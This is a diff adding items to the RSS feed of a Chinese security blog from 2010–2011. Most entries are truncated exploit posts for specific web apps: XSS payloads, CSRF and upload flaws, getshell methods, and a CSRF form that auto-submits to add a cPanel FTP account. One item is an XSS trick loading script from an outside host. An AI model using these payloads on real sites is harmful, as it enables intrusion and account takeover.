+      <pubDate>Wed, 27 Jul 2011 00:30:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1615/</guid>
+      <description>PHPaaCMS 4.0 oday 作者 菲哥哥 Blog http://hi.baidu.com/feihacker/ 1. Cookie欺骗: &amp;nbsp;&amp;nbsp;形成原因: &amp;nbsp;&amp;nbsp;只判断Cookie不为空就能登录到后台 &amp;nbsp;&amp;nbsp; if</description>
+    </item>
+    
+    <item>
+      <title>XSS 跨站代码大全 本人小小的总结</title>
+      <link>https://lcx.cc/post/1556/</link>
+      <pubDate>Sat, 09 Jul 2011 13:22:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1556/</guid>
+      <description>By：blackend &amp;lt;script&amp;gt;alert(&#34;跨站&#34;)&amp;lt;/script&amp;gt; (最常见的跨站代码） &amp;lt;img src=java</description>
+    </item>
+    
+    <item>
+      <title>NucleusCMS 更改管理配置 CSRF 漏洞</title>
+      <link>https://lcx.cc/post/1358/</link>
+      <pubDate>Mon, 23 May 2011 19:18:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1358/</guid>
+      <description>By：追心 漏洞说明： &amp;nbsp;&amp;nbsp;&amp;nbsp; Nucleus是一个用于管理一个或多个blog的工具。它采用PHP4开发并需要MySQL数据库支持。Nucleus具有</description>
+    </item>
+    
+    <item>
+      <title>99ko &lt;= 0.4b 存在多个CSRF/XSRF漏洞</title>
+      <link>https://lcx.cc/post/1349/</link>
+      <pubDate>Sun, 22 May 2011 10:57:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1349/</guid>
+      <description>&amp;nbsp;&amp;nbsp;&amp;nbsp; By：追心 漏洞说明： &amp;nbsp;&amp;nbsp;&amp;nbsp; 99ko &amp;lt;= 0.4b存在多个CSRF/XSRF漏洞，99ko多个CSRF/XSRF漏洞。，该漏洞导致任意远程修改网站相关信息</description>
+    </item>
+    
+    <item>
+      <title>【0day】Artyboard韩国论坛程序上传漏洞</title>
+      <link>https://lcx.cc/post/1131/</link>
+      <pubDate>Sun, 06 Feb 2011 16:29:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1131/</guid>
+      <description>&amp;nbsp;&amp;nbsp;&amp;nbsp; Artyboard 是韩国比较早期得一款 ASP 语言得论坛，广泛应用于韩国中小网站。 &amp;nbsp;&amp;nbsp;&amp;nbsp; 一、漏洞存在于页面“editor/editor_flash.asp”中。 ed</description>
+    </item>
+    
+    <item>
+      <title>【0day】Diy-Page v8.2 站群两个注入漏洞</title>
+      <link>https://lcx.cc/post/1125/</link>
+      <pubDate>Thu, 03 Feb 2011 01:21:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1125/</guid>
+      <description>&amp;nbsp;&amp;nbsp;&amp;nbsp; 漏洞名称：Diy-Page v8.2 站群系统两个注入漏洞分析 &amp;nbsp;&amp;nbsp;&amp;nbsp; 发布作者：子仪 &amp;nbsp;&amp;nbsp;&amp;nbsp; 发布日期：2011-2-2 &amp;nbsp;&amp;nbsp;&amp;nbsp; 影响版本：v8.2 &amp;nbsp;&amp;nbsp;&amp;nbsp; 程序介绍： &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; DiY-Page 创始于</description>
+    </item>
+    
+    <item>
+      <title>【Exp】“幸福百相园”相册 GetShell 漏洞</title>
+      <link>https://lcx.cc/post/1070/</link>
+      <pubDate>Fri, 07 Jan 2011 16:37:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/1070/</guid>
+      <description>漏洞出现在“index.php”，看代码： if($do == &#39;upload&#39;){&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;if($_POST[&#39;formsub&#39;]){ &amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;$file = $_FILES[&#39;upload&#39;]; &amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;if(!$file[&#39;error&#39;]){ &amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; if(strpos($file[&#39;type&#39;], &#39;image&#39;) === 0){ &amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;$hash = $_POST[&#39;i&#39;].&#39;.jpg&#39;; //若是IIS，则可此处可自行构</description>
+    </item>
+    
+    <item>
+      <title>【Html】Html Java脚本点击按钮跳转几种方式</title>
+      <link>https://lcx.cc/post/903/</link>
+      <pubDate>Sun, 07 Nov 2010 13:33:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/903/</guid>
+      <description>Html Java 脚本点击按钮跳转的几种方式： &amp;lt;input type=&#34;button&#34; name=&#34;no&#34; value=&#34;重置&#34; style=&#34;font-size:9pt;background-color:#000000;color=#00B000;border:1px solid green&#34; onclick=&#34;javascript:location.reload();&#34;&amp;gt; &amp;lt;input type=&#34;button&#34; name=&#34;btn&#34; value=&#34;跳转&#34; onclick=&#34;javascript:location.href=&#39;index.php&#39;&#34;&amp;gt; &amp;lt;input type=&#34;button&#34; name=&#34;btn&#34; value=&#34;返回&#34; onclick=&#34;javascript:history.back(-1)&#34;&amp;gt; 这个很简单，就不解</description>
+    </item>
+    
+    <item>
+      <title>【Html】Html Java脚本弹出对话框的三种形式</title>
+      <link>https://lcx.cc/post/897/</link>
+      <pubDate>Sat, 06 Nov 2010 14:02:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/897/</guid>
+      <description>Html Java 脚本弹出对话框的三种形式： 这个真没什么解释了。。基础啊。。 &amp;lt;script language=&#34;javascript&#34; type=&#34;text/javascript&#34;&amp;gt; function ale() {alert(&#34;我敢保证，你现在用的是演示一&#34;); } //这个基本没有</description>
+    </item>
+    
+    <item>
+      <title>Html 网页、页面中黑客风格的搜索栏、搜索框</title>
+      <link>https://lcx.cc/post/893/</link>
+      <pubDate>Fri, 05 Nov 2010 09:47:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/893/</guid>
+      <description>function index_search(){ var v=f.k.value if(f.o[0].checked==true) window.open(&#34;http://www.google.com/search?hl=zh-CN&amp;q=&#34;+v); if(f.o[1].checked==true) window.open(&#34;http://www.baidu.com/s?wd=&#34;+v); if(f.o[2].checked==true) window.open(&#34;http://www.yahoo.com.cn/search?p=&#34;+v); if(f.o[3].checked==true) window.open(&#34;http://www.iask.com/s?k=&#34;+v); if(f.o[4].checked==true) window.open(&#34;http://www.sogou.com/web?query=&#34;+v); if(f.o[5].checked==true) window.open(&#34;http://search.sina.com.cn/cgi-bin/search/search.cgi?_searchkey=&#34;+v); if(f.o[6].checked==true) window.open(&#34;http://cha.so.163.com/so.php?key=032153283&amp;q=&#34;+v); if(f.o[7].checked==true) window.open(&#34;http://site.search.sohu.com/sitesearch.jsp?page_index=0&amp;key_word=&#34;+v); return false;} //-- God Hacker Google 百度 雅虎 爱问 搜狗 新浪 网易 搜狐 Html 网页、页面中黑客风格的搜索栏、搜索框： &amp;lt;P align=center&amp;gt; &amp;lt;TABLE id=table937 cellSpacing=0 borderColorDark=#ffffff width=746 borderColorLight=#008000 border=1&amp;gt; &amp;lt;TBODY&amp;gt;&amp;lt;TR&amp;gt;&amp;lt;TD</description>
+    </item>
+    
+    <item>
+      <title>【转载】DedeCmsV5.6 本地包含里的上传漏洞</title>
+      <link>https://lcx.cc/post/447/</link>
+      <pubDate>Fri, 27 Aug 2010 03:39:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/447/</guid>
+      <description>之前就发现了这本地包含的利用方法： &amp;lt;form action=&#34;http://localhost:8090/plus/carbuyaction.php?dopost=return&amp;amp;action=xxx&amp;amp;code=../../include/dialog/select_soft_post&#34; method=&#34;post&#34; enctype=&#34;multipart/form-data&#34; name=&#34;QuickSearch&#34; id=&#34;QuickSearch&#34;&amp;gt; &amp;lt;input type=&#34;hidden&#34; name=&#34;newname&#34; value=&#34;1.asa&#34;&amp;gt; &amp;lt;input type=&#34;file&#34; name=&#34;uploadfile&#34;&amp;gt; &amp;lt;input type=&#34;submit&#34; value=&#34;搜索&#34; name=&#34;QuickSearchBtn&#34;&amp;gt; &amp;lt;/form&amp;gt; 上传一个图片木马（只改后辍名为图片类型就行），即可在</description>
+    </item>
+    
+    <item>
+      <title>【转载】dedecms v5.3-v5.6 Get Shell 0day</title>
+      <link>https://lcx.cc/post/423/</link>
+      <pubDate>Wed, 18 Aug 2010 12:03:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/423/</guid>
+      <description>此0day已经出现了相当长一段时间，今天配合小龙同学提供的日志看了下代码，了解了漏洞成因。大多同学对成因不感兴趣，这儿就只公布利用方法。 Gif89a{dede:field name=&#39;toby57&#39;</description>
+    </item>
+    
+    <item>
+      <title>【转载】不用AJAX照样能隐秘提交恶意表单</title>
+      <link>https://lcx.cc/post/387/</link>
+      <pubDate>Sat, 07 Aug 2010 13:41:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/387/</guid>
+      <description>&amp;nbsp;&amp;nbsp;&amp;nbsp; 今日跨站时，懒得写AJAX代码，想到了利用FORM target属性 + iframe来模拟恶意表单提交动作。 &amp;nbsp;&amp;nbsp;&amp;nbsp; XSS代码： &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;script language=&#39;javascript&#39; src=&#39;http://www.sswowo.com/hide.js&#39;&amp;gt;&amp;lt;/script&amp;gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; //恶意注</description>
+    </item>
+    
+    <item>
+      <title>【转载】SHOP363网店系统通杀漏洞</title>
+      <link>https://lcx.cc/post/350/</link>
+      <pubDate>Sun, 25 Jul 2010 12:38:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/350/</guid>
+      <description>&amp;nbsp;&amp;nbsp;&amp;nbsp; 呵呵，标题写的有点夸张，我看的是官方演示的最新版本3.3.6版本，看过代码我相信早期的版本应该写法是基本相同的，因为没找到早期版本的下载所</description>
+    </item>
+    
+    <item>
+      <title>【Exp】Cpanel v11.25 CSRF 添加管理员账号exp</title>
+      <link>https://lcx.cc/post/285/</link>
+      <pubDate>Mon, 05 Jul 2010 15:13:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/285/</guid>
+      <description>Cpanel v11.25 CSRF 添加管理员账号漏洞。 Exploite: &amp;lt;html&amp;gt; &amp;lt;body onload=&#34;javascript:fireForms()&#34;&amp;gt; &amp;lt;form method=&#34;POST&#34; name=&#34;form0&#34; action=&#34;http://server:2082/frontend/x3/ftp/doaddftp.html&#34;&amp;gt; &amp;lt;input type=&#34;hidden&#34; name=&#34;login&#34; value=&#34;name&#34;/&amp;gt; &amp;lt;input type=&#34;hidden&#34; name=&#34;password&#34; value=&#34;pass&#34;/&amp;gt; &amp;lt;input type=&#34;hidden&#34; name=&#34;password2&#34; value=&#34;pass&#34;/&amp;gt; &amp;lt;input type=&#34;hidden&#34; name=&#34;homedir&#34; value=&#34;/&#34;/&amp;gt; &amp;lt;input type=&#34;hidden&#34; name=&#34;quota&#34; value=&#34;unlimited&#34;/&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;&amp;nbsp;&amp;nbsp; 发布作者：G0D-F4Th3r ,由黑小子整理编辑 影响</description>
+    </item>
+    
+  </channel>
+</rss>
